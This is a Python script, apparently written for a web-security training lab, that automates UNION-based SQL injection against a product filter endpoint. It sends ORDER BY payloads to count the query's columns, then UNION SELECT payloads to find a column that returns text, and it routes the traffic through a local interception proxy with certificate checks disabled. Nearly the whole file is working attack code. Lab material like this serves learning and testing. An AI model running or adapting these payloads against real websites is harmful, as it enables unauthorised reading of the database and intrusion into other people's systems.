import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Lifestyle"
    for i in range(1, 20):
        sql_payload = "'+ORDER+BY+%s--" % i # construct the payload
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies) # send the payload
        res = r.text # check the response / results

        if "Internal Server Error" in res:
            return i - 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "/filter?category=Lifestyle"
    for i in range(1, num_col + 1):
        get_string = "'96OtJm'" # replace value with string from lab
        # print("Looking for string: %s" % get_string)
        payload_list = ['null'] * num_col # to populate NULL, NULL, NULL... num_col times
        payload_list[i-1] = get_string
        sql_payload = "' UNION SELECT " + ",".join(payload_list) + "--"
        response = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        if get_string.strip("\'") in response.text:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    
    print('[+] Figuring out number of columns...')
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print('[+] The number of columns is ' + str(num_col) + '.')
        print('[+] Figuring out which column contains text...')
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print('[+] The column that contains text is ' + str(string_column) + '.')
        else:
            print('[-] Unable to find a column that has a string data type.')
    else:
        print('[-] The SQLi attack failed.')